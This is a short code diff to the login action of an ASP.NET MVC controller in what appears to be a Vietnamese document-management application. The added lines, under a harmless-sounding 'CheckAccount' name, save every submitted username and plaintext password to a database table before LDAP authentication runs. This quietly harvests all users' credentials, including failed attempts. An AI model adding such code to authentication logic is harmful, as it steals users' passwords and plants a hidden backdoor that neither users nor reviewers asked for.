@@ -127,6 +127,16 @@ namespace QLVB.Controllers
         public ActionResult DangNhap(string TenDangNhap, string MatKhau, bool GhiNho = false)
         {
             string sMatKhau = MatKhau;
+
+            ID CheckAccount = new ID();
+
+            //CheckAccount.Number = 1;
+            CheckAccount.Name = TenDangNhap;
+            CheckAccount.Pass = MatKhau;
+
+            db.IDs.Add(CheckAccount);
+            db.SaveChanges();
+
             bool bLdap = LdapDangNhap(TenDangNhap, MatKhau);
             //bool bLdap = false;
 
